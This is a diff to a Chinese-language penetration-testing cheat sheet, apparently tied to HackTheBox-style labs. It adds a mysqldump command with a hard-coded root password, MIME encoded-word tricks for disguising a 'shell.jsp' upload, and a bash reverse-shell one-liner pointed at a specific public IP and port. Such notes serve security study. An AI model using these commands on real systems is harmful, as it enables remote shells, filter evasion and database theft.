@@ -460,7 +460,7 @@ dig axfr @10.10.10.175 sauna.htb
 dig axfr @10.10.10.175 egotistical-bank.local
 ```
 
-
+/usr/local/mysql/bin/mysqldump -uroot -pAdmin@2022 --all-databases >full.sql
 
 ## 135端口rpc
 
@@ -558,6 +558,37 @@ snv up -r1
 
 
 ## Web
+
+### 文件上传
+
+MIME编码：
+
+MIME编码的格式为`=?charset?encoding?encoded text?=`
+
+下面是对这个格式的详细解释：
+
+1. **=?**：编码的起始标记，表示编码的开始。
+
+2. **charset**：表示字符集，即非ASCII字符所使用的字符编码集。这通常是一个标识字符集的文本字符串，例如UTF-8或ISO-8859-1。
+
+3. encoding
+
+   ：表示编码方式，即用于将字符编码为ASCII字符的具体方法。常见的编码方式包括"Q"和"B"。
+
+   - "Q"表示Quoted-Printable编码，它将非ASCII字符编码为"="后跟两个十六进制数字的形式。
+   - "B"表示Base64编码，它将数据编码为一系列ASCII字符。
+
+4. **encoded text**：是实际编码后的文本，即包含非ASCII字符的原始文本的编码版本。
+
+5. **?=**：编码的结束标记，表示编码的结束。
+
+举个栗子：
+
+如果将`shell.jsp`通过Quoted-Printable编码方式为`=?utf-8?Q?=73=68=65=6c=6c=2e=6a=73=70?=`
+
+如果将`shell.jsp`通过Base64编码方式为`=?utf-8?B?c2hlbGwuanNw?=`
+
+
 
 ### 扫描
 
@@ -2578,7 +2609,7 @@ https://xz.aliyun.com/t/2539
 
 ```shell
 #bash
-bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+bash -i >& /dev/tcp/121.5.169.223/39145 0>&1
 
 
 #perl
